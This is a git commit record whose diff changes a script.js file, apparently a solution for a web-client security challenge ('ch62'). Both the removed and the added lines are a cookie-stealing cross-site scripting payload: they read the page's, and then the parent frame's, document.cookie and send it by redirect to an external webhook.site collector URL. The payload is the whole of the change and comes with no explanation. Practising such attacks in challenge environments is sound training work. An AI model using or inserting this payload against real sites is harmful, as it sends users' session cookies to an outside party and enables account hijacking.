8227c2dfc38388dc3bcb13f6996aded982113f5c
Nowaaayyy <105567753+Nowaaayyy@users.noreply.github.com>
2026-04-22 11:33:51 +0200

    Update script.js

--- web-client/ch62/script.js
+++ web-client/ch62/script.js
@@ -1,1 +1,2 @@
-document.location="https://webhook.site/c35e20ef-075e-4cc2-917b-22eda8f964a3?c="+document.cookie;
+var cookie = parent.document.cookie;
+parent.location = "https://webhook.site/c35e20ef-075e-4cc2-917b-22eda8f964a3?c=" + cookie;
